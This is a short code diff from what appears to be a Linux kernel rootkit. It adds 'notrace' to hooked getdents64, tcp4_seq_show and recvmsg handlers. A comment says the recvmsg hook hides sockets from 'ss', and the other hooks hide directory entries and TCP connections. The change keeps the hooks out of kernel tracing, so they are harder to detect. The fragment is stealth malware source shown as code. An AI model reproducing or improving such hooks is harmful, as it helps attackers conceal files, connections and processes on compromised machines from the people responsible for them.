@@ -7,7 +7,7 @@ asmlinkage int (*__orig_getdents64)(const struct pt_regs *regs) = NULL;
 asmlinkage long (*__orig_tcp4_seq_show)(struct seq_file *seq, void *v) = NULL;
 asmlinkage long (*__orig_recvmsg)(const struct pt_regs *regs) = NULL;
 
-asmlinkage int getdents64_hook(const struct pt_regs *regs) {
+asmlinkage int notrace getdents64_hook(const struct pt_regs *regs) {
     int ret;
     int fd = (int)regs->di;
     struct file *dir_f;
@@ -109,7 +109,7 @@ asmlinkage int getdents64_hook(const struct pt_regs *regs) {
     return new_size;
 }
 
-asmlinkage long tcp4_seq_show_hook(struct seq_file *seq, void *v) {
+asmlinkage long notrace tcp4_seq_show_hook(struct seq_file *seq, void *v) {
     struct sock *sk = v;
 
     if (v != SEQ_START_TOKEN) {
@@ -123,7 +123,7 @@ asmlinkage long tcp4_seq_show_hook(struct seq_file *seq, void *v) {
 // Be careful. Problems with older versions of the kernel.
 // Had a problem with struct user_msghdr... Think I figured it out.
 // Purpose: filter out the netlink socket dump for ss, and other processes
-asmlinkage long recvmsg_hook(const struct pt_regs *regs) {
+asmlinkage long notrace recvmsg_hook(const struct pt_regs *regs) {
     // Call the original recvmsg syscall
     long ret = __orig_recvmsg(regs);
     if (ret <= 0)
